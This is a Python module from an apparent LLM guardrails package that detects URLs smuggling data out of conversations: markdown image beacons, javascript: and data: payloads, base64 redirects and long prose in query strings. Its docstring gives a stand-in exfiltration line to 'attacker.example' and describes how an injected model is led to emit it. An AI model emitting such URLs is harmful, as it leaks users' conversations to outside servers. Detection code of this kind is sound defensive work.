"""URLs that carry data out, rather than URLs that fetch something in.

The attack is one line of markdown. A model is talked into emitting
``![x](https://attacker.example/p.png?d=<the conversation>)``, the client renders
the image without being asked, and the request carries the payload to a server
the user never chose. Nothing is clicked, nothing is visible, and the rendered
page shows a broken image at worst. The same shape rides in an HTML ``img src``,
in a ``data:`` URI that says it is a picture and is not, in a ``javascript:``
scheme laundered past a naive prefix test, and in a redirect whose real target
is base64 inside a query string.

Every signal here is STRUCTURAL, which is why this is a hand-written detector
rather than a ``PatternGuardrail``: what fires is a property of the URL's parts
after they are taken apart and decoded, and no regex over the raw text expresses
"this query value decodes to a sentence".

**No host list.** There is no safe-domain list, no allowlist and no exemption by
enumeration anywhere in this module, and that is decision 9 of the phase-3
design rather than an omission. An exemption that approximates a set with a
shape is chainable, and chaining it turns it into the channel: a list of
"trusted image hosts" is a list of hosts an attacker routes through. The only
thing that excuses a URL here is the absence of the structural property. The two
schemes named as signals are signals, not an allowlist: every other scheme is
neither trusted nor exempt, it simply carries none of these properties.

**Why the defaults differ by direction.** The exfiltration happens when model
output carrying the URL reaches a client that renders it, so output is the
enforcement point and denies. On input the same URL is an instrument planted in
a retrieved page or quoted by a user asking about it; redacting keeps the page
and keeps the question, and the model still sees that something was removed.

**No urllib.** The README claims no network calls and
``tests/test_readme.py::test_the_no_network_claim_holds_over_every_module_that_ships``
holds it by refusing an import of ``urllib`` anywhere under ``src/``, so this
module takes URLs apart by hand. ``urllib.parse`` opens no socket; the guard is
over module names and not over behaviour, deliberately, because a guard that
tried to tell parsing from fetching inside a package would be a guard nobody
could check.

Linear in the length of the content: a fixed number of ``finditer`` passes, then
one bounded decode per URL component.
"""

from __future__ import annotations

import base64
import binascii
import re
from collections.abc import Collection, Mapping
from dataclasses import dataclass
from html import unescape

from jamjet_guardrails._decode import decode, is_prose
from jamjet_guardrails._spans import _rewrite
from jamjet_guardrails.errors import GuardrailUnavailableError
from jamjet_guardrails.protocol import saw
from jamjet_guardrails.types import (
    Context,
    Decision,
    Direction,
    Finding,
    Kind,
    Provenance,
    Verdict,
)

URL_EXFILTRATION_TYPES = frozenset(
    {
        "DATA_URI_PAYLOAD",
        "LINK_QUERY_PAYLOAD",
        "MARKDOWN_IMAGE_EXFIL",
        "NESTED_REDIRECT",
        "SCRIPT_SCHEME",
    }
)

_VERSION = "0.1.0"

_RUNNABLE: frozenset[Direction] = frozenset({"input", "output"})

# The type that can only ever fire in one direction, held here rather than in
# prose so the constructor can refuse a configuration that selects it alone in
# the other one.
_OUTPUT_ONLY = frozenset({"LINK_QUERY_PAYLOAD"})

_DEFAULT_ON_DETECT: Mapping[Direction, Decision] = {"output": "deny", "input": "redact"}

# How long a decoded component has to be before reading as prose is a finding.
#
# Both were swept from 1 to 259 in steps of one over
# `corpora/url-exfiltration/in-repo.jsonl`, one at a time with everything else at
# its shipped setting, and both are the SMALLEST value reaching the best F1 on
# that sweep. Unlike the four alphabet floors in `_decode`, these two curves are
# not flat, so the sweep really does choose them and both sides of each cost
# something measured:
#
# | Floor | Value | Plateau | One below | One above the plateau |
# |---|---:|---|---|---|
# | image | 30 | 30 to 64 | 29: P 0.8889, F1 0.9014 | 65: R 0.8857, F1 0.8986 |
# | link | 136 | 136 to 176 | 135: P 0.8889, F1 0.9014 | 177: R 0.7714, F1 0.8308 |
#
# The image floor is bounded from below by legitimate caption parameters: at 29
# the 29-character `alt` text of `url-0086` fires, and `url-0085` and `url-0087`
# carry 19 and 28 characters of the same kind of real prose just under it. It is
# bounded from above by the shortest payload a positive carries, the
# 64-character hex body of `url-0003`, which stops firing at 65.
#
# **The link floor sits one character above the longest benign search query in
# this corpus, and that is exactly the overfitting risk, so it is stated rather
# than buried.** `url-0088` is a 135-character search query, labelled `allow`,
# and the plateau starts at 136 because of it. What keeps the number from being
# purely a fact about that one string is that the two populations still OVERLAP
# above it: `url-0083` and `url-0084` are a share intent and a prefilled issue
# body carrying 206 and 263 characters of ordinary prose, both labelled `allow`,
# and both fire at every floor up to their own length while the longest payload
# any positive carries is 176. No floor separates these populations. 136 is
# where the trade is least bad on this corpus, and a deployment whose
# exfiltrated conversations run shorter than that gets nothing from this signal
# at all.
_IMAGE_PROSE_FLOOR = 30
_LINK_PROSE_FLOOR = 136

# A markdown inline link or image. `(!?)` is what tells the two apart, and the
# destination class allows ONE level of balanced parentheses because CommonMark
# does and because `javascript:fetch('...')` is exactly that shape: a
# destination class of `[^\s)]*` stops at the first `)` and reports a construct
# whose closing parenthesis is still in the content, so a redaction leaves it
# standing. The two alternatives cannot both match at one position (`[^\s()]`
# excludes the parenthesis the other one requires), so there is no ambiguity for
# the engine to backtrack over.
_MD_INLINE = re.compile(
    r"(!?)\[[^\]\n]*\]\(\s*"
    r"(<[^>\n]*>|(?:[^\s()]|\([^\s()]*\))*)"
    r"(?:\s+(?:\"[^\"\n]*\"|'[^'\n]*'|\([^)\n]*\)))?"
    r"\s*\)"
)

# Reference-style use and its definition. The definition holds the URL, so that
# is where the span goes; whether it is an image is decided by how the LABEL is
# used, which is the only place that information exists.
_MD_REF_USE = re.compile(r"(!?)\[[^\]\n]*\]\[([^\]\n]*)\]")
_MD_REF_DEF = re.compile(r"^[ ]{0,3}\[([^\]\n]+)\]:[ \t]*(<[^>\n]*>|\S+)", re.MULTILINE)

_HTML_IMG = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE)
_HTML_A = re.compile(r"<a\b[^>]*?\bhref\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE)

# Bare URLs, and the discovery limit this class represents is disclosed rather
# than hidden. Any `scheme://` form is found, plus the four opaque schemes that
# matter to a signal here or to a corpus negative. A bare opaque scheme outside
# those four is NOT discovered, and the alternative was worse: a generic
# `[A-Za-z][A-Za-z0-9+.-]*:\S+` reports `Note:` and `TODO:` in ordinary prose as
# URLs. A markdown or HTML construct is discovered whatever its scheme, because
# the destination is whatever sits inside the parentheses or the attribute, so
# this limit reaches only text that is not a link in any renderer either.
_BARE_URL = re.compile(
    r"(?:[A-Za-z][A-Za-z0-9+.\-]*://|data:|javascript:|vbscript:|mailto:|tel:)[^\s<>\"'`]+",
    re.IGNORECASE,
)

# Trailing punctuation belongs to the sentence, not to the URL. Closing brackets
# are trimmed only where nothing opened them inside the match.
_TRAILING = ".,;:!?"

_SCRIPT_SCHEME = re.compile(r"\A(?:javascript|vbscript):", re.IGNORECASE)

# Removed before the scheme is read, because browsers remove exactly these from
# a URL before resolving it: every ASCII code point at or below space, plus
# DEL. `java\tscript:` and `java script:` are the same URL to the consumer, so
# they have to be the same URL here.
_STRIPPED = re.compile(r"[\x00-\x20\x7f]")

_DATA_URI = re.compile(r"\Adata:([^,]*),(.*)\Z", re.IGNORECASE | re.DOTALL)

# Active content inside a data URI, in the three shapes that execute. `on[a-z]+=`
# is the handler class and is deliberately a shape rather than a list of the
# handler names: a list is an enumeration, and the one handler left off it is
# the one worth catching.
_SCRIPT_TAG = re.compile(r"<\s*script\b", re.IGNORECASE)
_EVENT_HANDLER = re.compile(r"\bon[a-z]+\s*=", re.IGNORECASE)
_JAVASCRIPT_URL = re.compile(r"javascript:", re.IGNORECASE)

# What a real raster image starts with. A declared image whose body is text is
# lying about itself; a declared image whose body is bytes is an image whether
# or not this table knows its format, so an unknown signature is NOT a signal.
_IMAGE_SIGNATURES: tuple[bytes, ...] = (
    b"\x89PNG\r\n\x1a\n",
    b"\xff\xd8\xff",
    b"GIF87a",
    b"GIF89a",
    b"BM",
    b"RIFF",
    b"II*\x00",
    b"MM\x00*",
)

_ABSOLUTE_URL = re.compile(r"\A[A-Za-z][A-Za-z0-9+.\-]*://\S")

_HTTP_SCHEME = re.compile(r"\Ahttps?:", re.IGNORECASE)


@dataclass(frozen=True, slots=True)
class _Target:
    """One URL found in the content, and what a finding about it covers.

    ``span`` is the WHOLE construct for a markdown image or link, from ``![`` or
    ``[`` through the closing parenthesis, so a redaction does not leave
    ``![alt]()`` behind for the renderer to draw a broken image from. For an
    HTML attribute it is the URL inside the quotes, because the span of the tag
    would swallow attributes that have nothing to do with the finding, and for a
    bare URL or a reference definition it is the URL.
    """

    span: tuple[int, int]
    url: str
    image: bool


def _strip_delimiters(url: str) -> str:
    """``<...>`` around a markdown destination, and quotes around an attribute."""
    if len(url) >= 2 and url[0] == "<" and url[-1] == ">":
        return url[1:-1]
    if len(url) >= 2 and url[0] == url[-1] and url[0] in "\"'":
        return url[1:-1]
    return url


def _trim_bare(url: str) -> str:
    """Drop sentence punctuation and one unopened closing parenthesis.

    ``https://example.com/page.`` is a URL and a full stop, and a redaction that
    ate the full stop would be reporting a span it cannot justify. The
    parenthesis test counts rather than assuming: a URL that opened its own
    parenthesis keeps the one that closes it.
    """
    while url and url[-1] in _TRAILING:
        url = url[:-1]
    while url.endswith(")") and url.count(")") > url.count("("):
        url = url[:-1]
        while url and url[-1] in _TRAILING:
            url = url[:-1]
    return url


def _targets(content: str) -> list[_Target]:
    """Every URL the content offers a renderer, each with the span to redact.

    Discovery order is markdown, then HTML attributes, then reference
    definitions, then bare URLs, and the last of those reports only what no
    earlier construct already covers. Without that suppression the URL inside
    ``[text](https://...)`` is found twice and reported twice, once over the
    construct and once over the URL, which is one finding and two spans in an
    audit record that claims each is a separate detection.
    """
    found: list[_Target] = []
    covered: list[tuple[int, int]] = []

    image_labels: set[str] = set()
    for match in _MD_REF_USE.finditer(content):
        if match.group(1):
            image_labels.add(match.group(2).strip().lower())

    for match in _MD_INLINE.finditer(content):
        url = _strip_delimiters(match.group(2).strip())
        if url:
            found.append(_Target(match.span(), url, image=bool(match.group(1))))
        covered.append(match.span())

    for pattern, is_image in ((_HTML_IMG, True), (_HTML_A, False)):
        for match in pattern.finditer(content):
            raw = match.group(1)
            start, end = match.span(1)
            if raw and raw[0] in "\"'":
                start, end = start + 1, end - 1
            url = content[start:end].strip()
            if url:
                found.append(_Target((start, end), url, image=is_image))
            covered.append(match.span())

    for match in _MD_REF_DEF.finditer(content):
        raw = match.group(2)
        url = _strip_delimiters(raw)
        # The offset is derived from the delimiters, NOT from `url is not raw`.
        # That identity test read correctly and rested on `_strip_delimiters`
        # returning a new object, which is true of a slice and is not a promise
        # the function makes: return the argument unchanged for an undelimited
        # URL and the span silently shifts by one.
        angled = len(raw) >= 2 and raw.startswith("<") and raw.endswith(">")
        start = match.start(2) + (1 if angled else 0)
        if url:
            found.append(
                _Target(
                    (start, start + len(url)),
                    url,
                    image=match.group(1).strip().lower() in image_labels,
                )
            )
        covered.append(match.span())

    for match in _BARE_URL.finditer(content):
        start, end = match.span()
        if any(low <= start and end <= high for low, high in covered):
            continue
        url = _trim_bare(match.group())
        if url:
            found.append(_Target((start, start + len(url)), url, image=False))

    return found


def _normalised_scheme(url: str) -> str:
    """The URL as the consumer resolves it: entities decoded, then junk removed.

    That order is the browser's. Entity references are resolved by the HTML
    parser, and the URL parser then strips ASCII whitespace and controls from
    what it is handed, so ``java&#115;cript:`` and ``java&Tab;script:`` both
    arrive at the same scheme. Doing it the other way round leaves ``&#9;``
    intact inside the scheme and reads as a hostname.
    """
    return _STRIPPED.sub("", unescape(url))


def _url_parts(url: str) -> tuple[list[str], list[str]]:
    """Path segments and query keys and values of a hierarchical URL.

    Hand-rolled because ``urllib`` may not be imported here; see the module
    docstring. The fragment is dropped: it never leaves the client, so it is not
    a channel, and treating it as one would fire on every deep link to a heading.
    """
    body = url.split("#", 1)[0]
    after_scheme = body.split("://", 1)[-1]
    authority, _, rest = after_scheme.partition("/")
    del authority
    path, _, query = rest.partition("?")
    segments = [segment for segment in path.split("/") if segment]
    fields: list[str] = []
    for pair in query.split("&"):
        if not pair:
            continue
        key, sep, value = pair.partition("=")
        fields.append(key)
        if sep:
            fields.append(value)
    return segments, fields


def _url_decoded(component: str) -> str:
    """One URL component with its transport encoding undone, and nothing else.

    Percent-escapes and ``+`` are URL SYNTAX, not a payload encoding: undoing
    them is reading the URL, the way splitting on ``&`` is. The payload
    alphabets are tried on the result, which keeps the one-level rule where it
    belongs, on the payload. ``corpora/NOTICE.md`` names what that does not
    reach.
    """
    decoded = decode(component, "percent")
    return (decoded if decoded is not None else component).replace("+", " ")


def _readings(component: str) -> list[str]:
    """Every way this component could be read as text, at one payload level."""
    plain = _url_decoded(component)
    readings = [plain]
    for encoding in ("base64", "hex", "rot13"):
        text = decode(plain, encoding)
        if text is not None:
            readings.append(text)
    return readings


def _data_uri_payload(url: str) -> bool:
    """Whether a ``data:`` URI is something other than what it declares itself.

    Three ways, and each is a lie of its own kind: a declared ``text/html`` is
    a document rendered from a link; active content is a script wherever it
    sits; and a declared raster image whose body is text is not an image at all.
    A declared image whose body is bytes this table does not recognise is left
    alone, because an unknown image format is an image and a signature list used
    as a requirement rather than as evidence would deny one.
    """
    match = _DATA_URI.match(url)
    if match is None:
        return False
    meta = match.group(1).strip().lower()
    body = match.group(2)
    media_type = meta.split(";")[0] or "text/plain"
    if media_type.startswith("text/html"):
        return True

    if ";base64" in meta:
        packed = "".join(body.split())
        try:
            raw = base64.b64decode(packed + "=" * (-len(packed) % 4), validate=False)
        except (binascii.Error, ValueError):
            raw = b""
    else:
        decoded = decode(body, "percent")
        raw = (decoded if decoded is not None else body).encode("utf-8", "replace")

    # errors="replace" rather than a strict decode: this test asks whether a
    # script is IN the body, and a body that is mostly binary with a `<script`
    # in it is still a body with a script in it.
    text = raw.decode("utf-8", "replace")
    if _SCRIPT_TAG.search(text) or _EVENT_HANDLER.search(text) or _JAVASCRIPT_URL.search(text):
        return True

    if media_type.startswith("image/") and media_type != "image/svg+xml":
        if raw.startswith(_IMAGE_SIGNATURES):
            return False
        try:
            raw.decode("utf-8")
        except UnicodeDecodeError:
            return False
        return bool(raw)
    return False


def _nested_redirect(components: list[str]) -> bool:
    """A component that base64- or hex-decodes to an absolute URL.

    Encoding an inner URL serves no transport purpose: a redirect target is
    percent-encoded by every framework that writes one, and percent-encoding is
    what the query syntax already provides. So a plain percent-encoded
    ``redirect_uri`` does NOT fire, which is what keeps every OAuth link in the
    corpus allowed, and that is a disclosed hole rather than an oversight.
    """
    for component in components:
        plain = _url_decoded(component)
        for encoding in ("base64", "hex"):
            text = decode(plain, encoding)
            if text is not None and _ABSOLUTE_URL.match(text):
                return True
    return False


def _prose_component(components: list[str], floor: int) -> bool:
    """A component that reads as prose at or above ``floor`` characters.

    The floor is the whole trade and it is disclosed as one. An image request
    does not need to say anything, so any sentence inside one is a channel; a
    search link says something short on purpose, so the floor is what separates
    the two, and a search query longer than it is a false positive this check
    accepts and publishes.
    """
    for component in components:
        for reading in _readings(component):
            if len(reading) >= floor and is_prose(reading):
                return True
    return False


class UrlExfiltrationGuardrail:
    """Detects URLs that carry data out rather than fetch something in."""

    name: str = "url-exfiltration"
    version: str = _VERSION
    kind: Kind = "constraint"
    directions: frozenset[Direction]

    def __init__(
        self,
        on_detect: Decision | Mapping[Direction, Decision] | None = None,
        types: Collection[str] | None = None,
        directions: frozenset[Direction] = frozenset({"input", "output"}),
    ) -> None:
        """Refuses, at construction, every configuration that would check less.

        The same doctrine ``detectors.build`` and ``PatternGuardrail.__init__``
        already apply, reached here from a caller's own configuration file:

        - ``types`` empty, or a bare string (which iterates as its own
          characters): the check would report nothing and allow every URL.
        - a ``types`` entry outside ``URL_EXFILTRATION_TYPES``: a type nobody
          can produce is a selection that quietly narrows the check.
        - ``directions`` empty, or naming a direction no ``Context`` carries:
          every context skips it, so it is configured and silent.
        - an ``on_detect`` mapping that omits a declared direction, or names one
          that is not declared: the first is a ``KeyError`` mid-check, the
          second is a policy silently dropped.
        - ``allow`` as a decision: a check configured to allow on a detection is
          a check that runs and cannot act.
        - a selection that leaves only output-only types in an input-only
          configuration. ``LINK_QUERY_PAYLOAD`` never fires on input, so
          ``types={"LINK_QUERY_PAYLOAD"}`` with ``directions={"input"}`` builds a
          guardrail that runs on every message and can never report anything.
        """
        if isinstance(types, (str, bytes)):
            raise ValueError(  # noqa: TRY004
                f"types must be a collection of finding types, not the "
                f"{type(types).__name__} {types!r}; a string is an iterable of its "
                "own characters"
            )
        selected = frozenset(URL_EXFILTRATION_TYPES if types is None else types)
        unknown = sorted(selected - URL_EXFILTRATION_TYPES)
        if unknown:
            raise ValueError(
                f"unknown finding type(s) {unknown}; expected a subset of "
                f"{sorted(URL_EXFILTRATION_TYPES)}"
            )
        if not selected:
            raise GuardrailUnavailableError(
                "url-exfiltration was configured with no finding types, so it would "
                "check nothing and allow every URL"
            )

        if not directions:
            raise GuardrailUnavailableError(
                "url-exfiltration declares no direction it can run in, so every "
                f"context would skip it. Expected at least one of {sorted(_RUNNABLE)}"
            )
        undeliverable = sorted(directions - _RUNNABLE)
        if undeliverable:
            raise GuardrailUnavailableError(
                f"url-exfiltration declares direction(s) {undeliverable}, but a Context "
                f"never carries these (its direction is one of {sorted(_RUNNABLE)}), so "
                "the guardrail would never be checked for these directions"
            )
        if selected <= _OUTPUT_ONLY and "output" not in directions:
            raise GuardrailUnavailableError(
                f"url-exfiltration was configured with {sorted(selected)}, which fires "
                f"on output only, and directions {sorted(directions)}; it would run on "
                "every message and never report anything"
            )

        if on_detect is None:
            # The DEFAULT is narrowed to the declared directions rather than
            # validated like a caller's mapping. It names both directions
            # because both are declared by default, so running it through the
            # extra-key refusal below made `directions={"output"}` alone
            # unbuildable: the caller had written no policy at all and was told
            # their policy named a direction they had not declared.
            resolved = {direction: _DEFAULT_ON_DETECT[direction] for direction in directions}
        elif isinstance(on_detect, str):
            resolved = {direction: on_detect for direction in directions}
        else:
            policy = on_detect
            missing = sorted(directions - set(policy))
            if missing:
                raise GuardrailUnavailableError(
                    f"url-exfiltration declares directions {sorted(directions)} but "
                    f"on_detect names no decision for {missing}; the alternative is a "
                    "KeyError from inside check, which fails closed and names nothing"
                )
            extra = sorted(set(policy) - directions)
            if extra:
                raise GuardrailUnavailableError(
                    f"url-exfiltration declares directions {sorted(directions)} but "
                    f"on_detect also names {extra}, which this guardrail would never be "
                    "asked about; a policy for a direction it does not declare would be "
                    "silently dropped"
                )
            resolved = {direction: policy[direction] for direction in directions}
        for direction, decision in sorted(resolved.items()):
            if decision not in ("redact", "deny"):
                raise ValueError(
                    f"on_detect for {direction!r} must be 'redact' or 'deny', got "
                    f"{decision!r}. A check configured to allow on a detection is a "
                    "check that runs and cannot act"
                )

        self.directions = directions
        self._types = selected
        self._on_detect: Mapping[Direction, Decision] = resolved

    def _matches(self, content: str, direction: Direction) -> list[tuple[str, tuple[int, int]]]:
        """Every span every signal claims, sorted by span, deduplicated by pair.

        SORTED BY SPAN is a precondition of ``_spans._merge``, which tests each
        span against the running end of the region it is extending and looks no
        further back. Signals here run per URL and URLs are found construct type
        by construct type, so the list they concatenate into is in neither order
        until this sorts it.

        One finding per type per URL. A data URI that declares ``text/html`` AND
        carries a script is one lie about one URL, and reporting it twice would
        put two detections in an audit record for one construct.
        """
        found: dict[tuple[tuple[int, int], str], None] = {}

        def claim(target: _Target, type_name: str) -> None:
            if type_name in self._types:
                found[(target.span, type_name)] = None

        for target in _targets(content):
            scheme_view = _normalised_scheme(target.url)
            if _SCRIPT_SCHEME.match(scheme_view):
                claim(target, "SCRIPT_SCHEME")
                continue
            if _data_uri_payload(target.url):
                claim(target, "DATA_URI_PAYLOAD")
                continue
            if not _HTTP_SCHEME.match(scheme_view):
                continue
            segments, fields = _url_parts(target.url)
            components = segments + fields
            if _nested_redirect(components):
                claim(target, "NESTED_REDIRECT")
            if target.image:
                if _prose_component(components, _IMAGE_PROSE_FLOOR):
                    claim(target, "MARKDOWN_IMAGE_EXFIL")
            elif direction == "output" and _prose_component(components, _LINK_PROSE_FLOOR):
                claim(target, "LINK_QUERY_PAYLOAD")

        return sorted(((type_name, span) for span, type_name in found), key=lambda pair: pair[1])

    def check(self, content: str, context: Context) -> Verdict:
        """Refuses a direction this guardrail does not declare, before matching.

        The chain filters on ``directions`` before it calls ``check``, and a
        caller holding one guardrail does not, so this method holds the line the
        chain holds for it. Answering ``allow`` for a direction this guardrail
        never declared would report that the content was checked.
        """
        if context.direction not in self.directions:
            raise GuardrailUnavailableError(
                f"{self.name!r} was asked to check direction {context.direction!r} but "
                f"declares only {sorted(self.directions)}; answering would report that "
                "content was checked in a direction this guardrail never declared"
            )
        provenance = Provenance(kind="constraint", detector=self.name, version=self.version)
        found = self._matches(content, context.direction)
        if not found:
            return Verdict("allow", None, [], provenance, saw(content))

        findings = [Finding(type=type_name, span=span) for type_name, span in found]
        if self._on_detect[context.direction] == "deny":
            return Verdict("deny", None, findings, provenance, saw(content))
        return Verdict("redact", _rewrite(content, found), findings, provenance, saw(content))
